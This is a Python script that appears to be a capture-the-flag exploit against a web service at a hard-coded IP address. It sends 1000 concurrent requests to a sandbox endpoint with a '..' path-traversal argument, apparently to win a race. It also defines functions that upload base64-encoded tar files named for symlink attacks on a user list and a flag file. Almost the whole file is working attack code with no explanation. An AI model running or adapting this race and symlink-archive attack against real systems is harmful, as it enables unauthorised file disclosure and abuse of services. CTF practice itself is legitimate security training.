import asyncio
import aiohttp
import requests
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
import concurrent.futures
import base64

import urllib.parse


N = 1000
# Method 1: Using asyncio + aiohttp (Recommended for many requests)
async def async_requests_example():
    
    """Send 3 concurrent requests using asyncio and aiohttp"""
    print("=== Method 1: AsyncIO + aiohttp ===")
    
    urls = [
    ]
    
    for i in range(N):
        urls.append('http://174.138.16.103:28054/sandbox?method=mktempdir&args=..')
    async def fetch(session, url):
        start_time = time.time()
        try:
            if 'delay' in url:
                delay = int(url.split('delay=')[1])
                # print(f"Delaying request to {url} by {delay}ms")
                await asyncio.sleep(delay/100)
            async with session.get(url) as response:
                data = await response.json()
                end_time = time.time()
                return {
                    'url': url[:50] if len(url) > 50 else url,
                    'status': response.status,
                    'data': str(data)[:100] if len(str(data))>1000 else data,
                    'time': end_time - start_time
                }
        except Exception as e:
            end_time = time.time()
            return {
                'url': url,
                'error': str(e),
                'time': end_time - start_time
            }
    
    start_total = time.time()
    
    async with aiohttp.ClientSession() as session:
        # Send all requests concurrently
        tasks = [fetch(session, url) for url in urls]
        results = await asyncio.gather(*tasks)
    
    end_total = time.time()
    
    print(f"Total time: {end_total - start_total:.2f}s")
    for i, result in enumerate(results, 1):
        print(f"Request {i}: {result}")
    
    return results




def upload_users_link():
    with open('users_link.tar', 'rb') as f:
        tar_bytes = f.read()
        tar64 = base64.b64encode(tar_bytes).decode('utf-8')
    url = 'http://174.138.16.103:28054/upload'
    # url = 'http://174.138.16.103:28054/upload?tar=' + tar64
    
    response = requests.get(url, params={'tar': tar64})
    print(f"Upload response: {response.status_code} - {response.text[:100]}")
    
def upload_flag_link():
    with open('flag_link.tar', 'rb') as f:
        tar_bytes = f.read()
        tar64 = base64.b64encode(tar_bytes).decode('utf-8')
    url = 'http://174.138.16.103:28054/upload'
    # url = 'http://174.138.16.103:28054/upload?tar=' + tar64
    
    response = requests.get(url, params={'tar': tar64})
    print(f"Upload response: {response.status_code} - {response.text[:100]}")
    

asyncio.run(async_requests_example())

r = requests.get('http://174.138.16.103:28054/list_users')
print(len(r.text))
# upload_flag_link()